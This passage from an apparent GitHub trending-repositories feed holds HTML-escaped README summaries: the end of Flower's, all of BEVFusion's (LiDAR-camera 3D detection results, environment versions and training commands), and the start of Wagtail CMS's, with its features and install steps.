&#xA;&lt;a href=&#34;https://github.com/adap/flower/graphs/contributors&#34;&gt; &lt;img src=&#34;https://contrib.rocks/image?repo=adap/flower&#34;&gt; &lt;/a&gt; &#xA;&lt;h2&gt;Citation&lt;/h2&gt; &#xA;&lt;p&gt;If you publish work that uses Flower, please cite Flower as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@article{beutel2020flower,&#xA;  title={Flower: A Friendly Federated Learning Research Framework},&#xA;  author={Beutel, Daniel J and Topal, Taner and Mathur, Akhil and Qiu, Xinchi and Parcollet, Titouan and Lane, Nicholas D},&#xA;  journal={arXiv preprint arXiv:2007.14390},&#xA;  year={2020}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Please also consider adding your publication to the list of Flower-based publications in the docs, just open a Pull Request.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing to Flower&lt;/h2&gt; &#xA;&lt;p&gt;We welcome contributions. Please see &lt;a href=&#34;https://raw.githubusercontent.com/adap/flower/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; to get started!&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ADLab-AutoDrive/BEVFusion</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/ADLab-AutoDrive/BEVFusion</id>
    <link href="https://github.com/ADLab-AutoDrive/BEVFusion" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Offical PyTorch implementation of &#34;BEVFusion: A Simple and Robust LiDAR-Camera Fusion Framework&#34;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Code of BEVFusion: A Simple and Robust LiDAR-Camera Fusion Framework.&lt;/h1&gt; &#xA;&lt;p&gt;This paper focuses on LiDAR-camera fusion for 3D object detection. If you find this project useful, please cite:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;@article{liang2022bevfusion,&#xA;  title={{BEVFusion: A Simple and Robust LiDAR-Camera Fusion Framework}},&#xA;  author={Tingting Liang, Hongwei Xie, Kaicheng Yu, Zhongyu Xia, Zhiwei Lin, Yongtao Wang, Tao Tang, Bing Wang and Zhi Tang},&#xA;  journal={arxiv},&#xA;  year={2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;Fusing the camera and LiDAR information has become a de-facto standard for 3D object detection tasks. Current methods rely on point clouds from the LiDAR sensor as queries to leverage the feature from the image space. However, people discover that this underlying assumption makes the current fusion framework infeasible to produce any prediction when there is a LiDAR malfunction, regardless of minor or major. This fundamentally limits the deployment capability to realistic autonomous driving scenarios. In contrast, we propose a surprisingly simple yet novel fusion framework, dubbed BEVFusion, whose camera stream does not depend on the input of LiDAR data, thus addressing the downside of previous methods. We empirically show that our framework surpasses the state-of-the-art methods under the normal training settings. Under the robustness training settings that simulate various LiDAR malfunctions, our framework significantly surpasses the state-of-the-art methods by 15.7% to 28.9% mAP. To the best of our knowledge, we are the first to handle realistic LiDAR malfunction and can be deployed to realistic scenarios without any post-processing procedure.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/resources/pipeline.png&#34; alt=&#34;pipeline&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Main Results&lt;/h2&gt; &#xA;&lt;h3&gt;nuScenes detection test&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;   &lt;th&gt;Head&lt;/th&gt; &#xA;   &lt;th&gt;3DBackbone&lt;/th&gt; &#xA;   &lt;th&gt;2DBackbone&lt;/th&gt; &#xA;   &lt;th&gt;mAP&lt;/th&gt; &#xA;   &lt;th&gt;NDS&lt;/th&gt; &#xA;   &lt;th&gt;Link&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/bevf_tf_4x8_6e_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;69.2&lt;/td&gt; &#xA;   &lt;td&gt;71.8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/1vnGBTl2zCL2JM6EKpDxsqbs_CKayc1Gf/view?usp=sharing&#34;&gt;Detection&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;nuScenes detection validation&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;   &lt;th&gt;Head&lt;/th&gt; &#xA;   &lt;th&gt;3DBackbone&lt;/th&gt; &#xA;   &lt;th&gt;2DBackbone&lt;/th&gt; &#xA;   &lt;th&gt;mAP&lt;/th&gt; &#xA;   &lt;th&gt;NDS&lt;/th&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/cam_stream/bevf_pp_4x8_2x_nusc_cam.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;22.9&lt;/td&gt; &#xA;   &lt;td&gt;31.1&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/1OeDjGoKpU1FQ42_18pJZ-UqwxLDc6HRc/view?usp=sharing&#34;&gt;Model&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/lidar_stream/hv_pointpillars_secfpn_sbn-all_4x8_2x_nus-3d.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;35.1&lt;/td&gt; &#xA;   &lt;td&gt;49.8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/1CBF0g1i23hfS-KRihX9J6QF2CglbWjsM/view?usp=sharing&#34;&gt;Model&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/bevf_pp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;53.5&lt;/td&gt; &#xA;   &lt;td&gt;60.4&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/1ibsCQ7cPGDBmhlfwKICnu5ePNL1_KlWg/view?usp=sharing&#34;&gt;Model&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/cam_stream/bevf_cp_4x8_20e_nusc_cam.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;CenterPoint&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;27.1&lt;/td&gt; &#xA;   &lt;td&gt;32.1&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/lidar_stream/centerpoint_0075voxel_second_secfpn_dcn_circlenms_4x8_cyclic_20e_nus.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;CenterPoint&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;57.1&lt;/td&gt; &#xA;   &lt;td&gt;65.4&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/bevf_cp_4x8_6e_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;CenterPoint&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;64.2&lt;/td&gt; &#xA;   &lt;td&gt;68.0&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/cam_stream/bevf_tf_4x8_20e_nusc_cam.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;22.7&lt;/td&gt; &#xA;   &lt;td&gt;26.1&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/lidar_stream/transfusion_nusc_voxel_L.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;64.9&lt;/td&gt; &#xA;   &lt;td&gt;69.9&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/bevf_tf_4x8_6e_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;67.9&lt;/td&gt; &#xA;   &lt;td&gt;71.0&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;nuScenes detection validation against LiDAR Malfunctions&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/resources/lidar_robust.png&#34; alt=&#34;LiDAR Malfunctions Visualization&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Infos for random box dropping in validation set are in &lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/drop_foreground.json&#34;&gt;drop_foreground.json&lt;/a&gt;, with LiDAR file name: dropping box (True) or not (False).&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;   &lt;th&gt;Limited FOV&lt;/th&gt; &#xA;   &lt;th&gt;Objects failure&lt;/th&gt; &#xA;   &lt;th&gt;Head&lt;/th&gt; &#xA;   &lt;th&gt;3DBackbone&lt;/th&gt; &#xA;   &lt;th&gt;2DBackbone&lt;/th&gt; &#xA;   &lt;th&gt;mAP&lt;/th&gt; &#xA;   &lt;th&gt;NDS&lt;/th&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_fov/fov60_bevf_pp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(-π/3,π/3)&lt;/td&gt; &#xA;   &lt;td&gt;False&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;33.5&lt;/td&gt; &#xA;   &lt;td&gt;42.1&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/18PQ7IEtdNji5nJZCb9d1FVPDfEWA9PU5/view?usp=sharing&#34;&gt;Model&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_fov/fov90_bevf_pp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(-π/2,π/2)&lt;/td&gt; &#xA;   &lt;td&gt;False&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;36.8&lt;/td&gt; &#xA;   &lt;td&gt;45.8&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/1HLkDsZr3R1FgRX6SeW3XhGKFcUVJluoV/view?usp=sharing&#34;&gt;Model&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_bbox/halfbox_bevf_pp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;True&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;PointPillars&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;41.6&lt;/td&gt; &#xA;   &lt;td&gt;51.9&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://drive.google.com/file/d/12QESExZCCHC0ZJlHnAi50VAWMU_OA2uo/view?usp=sharing&#34;&gt;Model&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_fov/fov60_bevf_cp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(-π/3,π/3)&lt;/td&gt; &#xA;   &lt;td&gt;False&lt;/td&gt; &#xA;   &lt;td&gt;CenterPoint&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;40.9&lt;/td&gt; &#xA;   &lt;td&gt;49.9&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_fov/fov90_bevf_cp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(-π/2,π/2)&lt;/td&gt; &#xA;   &lt;td&gt;False&lt;/td&gt; &#xA;   &lt;td&gt;CenterPoint&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;45.5&lt;/td&gt; &#xA;   &lt;td&gt;54.9&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_bbox/halfbox_bevf_cp_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;True&lt;/td&gt; &#xA;   &lt;td&gt;CenterPoint&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;54.0&lt;/td&gt; &#xA;   &lt;td&gt;61.6&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_fov/fov60_bevf_tf_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(-π/3,π/3)&lt;/td&gt; &#xA;   &lt;td&gt;False&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;41.5&lt;/td&gt; &#xA;   &lt;td&gt;50.8&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_fov/fov90_bevf_tf_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;(-π/2,π/2)&lt;/td&gt; &#xA;   &lt;td&gt;False&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;46.4&lt;/td&gt; &#xA;   &lt;td&gt;55.8&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/bevfusion/drop_bbox/halfbox_bevf_tf_4x8_1x_nusc.py&#34;&gt;BEVFusion&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;True&lt;/td&gt; &#xA;   &lt;td&gt;TransFusion-L&lt;/td&gt; &#xA;   &lt;td&gt;VoxelNet&lt;/td&gt; &#xA;   &lt;td&gt;Dual-Swin-T&lt;/td&gt; &#xA;   &lt;td&gt;50.3&lt;/td&gt; &#xA;   &lt;td&gt;57.6&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Use BEVFusion&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Please refer to &lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/docs/getting_started.md&#34;&gt;getting_started.md&lt;/a&gt; for installation of mmdet3d.&lt;/p&gt; &#xA;&lt;p&gt;Recommended environments:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python==3.8.3&#xA;mmdet==2.11.0 (please install mmdet in mmdetection-2.11.0)&#xA;mmcv==1.4.0&#xA;mmdet3d==0.11.0&#xA;numpy==1.19.2&#xA;torch==1.7.0&#xA;torchvision==0.8.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Benchmark Evaluation and Training&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Please refer to &lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/docs/getting_started.md&#34;&gt;data_preparation.md&lt;/a&gt; to prepare the data. Then follow the instruction there to train our model. All detection configurations are included in &lt;a href=&#34;https://raw.githubusercontent.com/ADLab-AutoDrive/BEVFusion/main/configs/&#34;&gt;configs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# training example for bevfusion-pointpillar &#xA;# train nuimage for camera stream backbone and neck.&#xA;./tools/dist_train.sh configs/bevfusion/cam_stream/mask_rcnn_dbswin-t_fpn_3x_nuim_cocopre.py 8&#xA;# first train camera stream&#xA;./tools/dist_train.sh configs/bevfusion/cam_stream/bevf_pp_4x8_2x_nusc_cam.py 8&#xA;# then train LiDAR stream&#xA;./tools/dist_train.sh configs/bevfusion/lidar_stream/hv_pointpillars_secfpn_sbn-all_4x8_2x_nus-3d.py 8&#xA;# then train BEVFusion&#xA;./tools/dist_train.sh configs/bevfusion/bevf_pp_4x8_1x_nusc.py 8&#xA;&#xA;### evaluation example for bevfusion-pointpillar&#xA;./tools/dist_test.sh configs/bevfusion/bevf_pp_4x8_1x_nusc.py ./work_dirs/bevfusion_pp.pth 8 --eval bbox&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Acknowlegement&lt;/h2&gt; &#xA;&lt;p&gt;We sincerely thank the authors of &lt;a href=&#34;https://github.com/open-mmlab/mmdetection3d&#34;&gt;mmdetection3d&lt;/a&gt;, &lt;a href=&#34;https://github.com/XuyangBai/TransFusion&#34;&gt;TransFusion&lt;/a&gt;, &lt;a href=&#34;https://github.com/nv-tlabs/lift-splat-shoot&#34;&gt;LSS&lt;/a&gt;, &lt;a href=&#34;https://github.com/tianweiy/CenterPoint&#34;&gt;CenterPoint&lt;/a&gt; for open sourcing their methods.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wagtail/wagtail</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/wagtail/wagtail</id>
    <link href="https://github.com/wagtail/wagtail" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A Django content management system focused on flexibility and user experience&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; &lt;img width=&#34;343&#34; src=&#34;https://raw.githubusercontent.com/wagtail/wagtail/main/.github/wagtail.svg#gh-light-mode-only&#34; alt=&#34;Wagtail&#34;&gt; &lt;img width=&#34;343&#34; src=&#34;https://raw.githubusercontent.com/wagtail/wagtail/main/.github/wagtail-inverse.svg#gh-dark-mode-only&#34; alt=&#34;Wagtail&#34;&gt; &lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;br&gt; &lt;a href=&#34;https://github.com/wagtail/wagtail/actions&#34;&gt; &lt;img src=&#34;https://github.com/wagtail/wagtail/workflows/Wagtail%20CI/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://opensource.org/licenses/BSD-3-Clause&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/license-BSD-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://pypi.python.org/pypi/wagtail/&#34;&gt; &lt;img src=&#34;https://img.shields.io/pypi/v/wagtail.svg?sanitize=true&#34; alt=&#34;Version&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://lgtm.com/projects/g/wagtail/wagtail/alerts/&#34;&gt; &lt;img src=&#34;https://img.shields.io/lgtm/alerts/g/wagtail/wagtail.svg?logo=lgtm&amp;amp;logoWidth=18&#34; alt=&#34;Total alerts&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://lgtm.com/projects/g/wagtail/wagtail/context:python&#34;&gt; &lt;img src=&#34;https://img.shields.io/lgtm/grade/python/g/wagtail/wagtail.svg?logo=lgtm&amp;amp;logoWidth=18&#34; alt=&#34;Language grade: Python&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://lgtm.com/projects/g/wagtail/wagtail/context:javascript&#34;&gt; &lt;img src=&#34;https://img.shields.io/lgtm/grade/javascript/g/wagtail/wagtail.svg?logo=lgtm&amp;amp;logoWidth=18&#34; alt=&#34;Language grade: JavaScript&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://pypi.python.org/pypi/wagtail/&#34;&gt; &lt;img src=&#34;https://img.shields.io/pypi/dm/wagtail?logo=Downloads&#34; alt=&#34;Monthly downloads&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;Wagtail is an open source content management system built on Django, with a strong community and commercial support. It&#39;s focused on user experience, and offers precise control for designers and developers.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/wagtail/wagtail@main/.github/wagtail-screenshot-with-browser.png&#34; alt=&#34;Wagtail screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;🔥 Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A fast, attractive interface for authors&lt;/li&gt; &#xA; &lt;li&gt;Complete control over front-end design and structure&lt;/li&gt; &#xA; &lt;li&gt;Scales to millions of pages and thousands of editors&lt;/li&gt; &#xA; &lt;li&gt;Fast out of the box, cache-friendly when you need it&lt;/li&gt; &#xA; &lt;li&gt;Content API for &#39;headless&#39; sites with de-coupled front-end&lt;/li&gt; &#xA; &lt;li&gt;Runs on a Raspberry Pi or a multi-datacenter cloud platform&lt;/li&gt; &#xA; &lt;li&gt;StreamField encourages flexible content without compromising structure&lt;/li&gt; &#xA; &lt;li&gt;Powerful, integrated search, using Elasticsearch or PostgreSQL&lt;/li&gt; &#xA; &lt;li&gt;Excellent support for images and embedded content&lt;/li&gt; &#xA; &lt;li&gt;Multi-site and multi-language ready&lt;/li&gt; &#xA; &lt;li&gt;Embraces and extends Django&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Find out more at &lt;a href=&#34;https://wagtail.org/&#34;&gt;wagtail.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;👉 Getting started&lt;/h3&gt; &#xA;&lt;p&gt;Wagtail works with &lt;a href=&#34;https://www.python.org/downloads/&#34;&gt;Python 3&lt;/a&gt;, on any platform.&lt;/p&gt; &#xA;&lt;p&gt;To get started with using Wagtail, run the following in a virtual environment:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wagtail/wagtail/main/.github/install-animation.gif&#34; alt=&#34;Installing Wagtail&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install wagtail&#xA;wagtail start mysite&#xA;cd mysite&#xA;pip install -r requirements.txt&#xA;python manage.py migrate&#xA;python manage.py createsuperuser&#xA;python manage.py runserver&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For detailed installation and setup docs, see &lt;a href=&#34;https://docs.wagtail.org/en/stable/getting_started/tutorial.html&#34;&gt;the getting started tutorial&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;👨‍👩‍👧‍👦 Who’s using it?&lt;/h3&gt; &#xA;&lt;p&gt;Wagtail is used by &lt;a href=&#34;https://www.nasa.gov/&#34;&gt;NASA&lt;/a&gt;, &lt;a href=&#34;https://www.google.com/&#34;&gt;Google&lt;/a&gt;, &lt;a 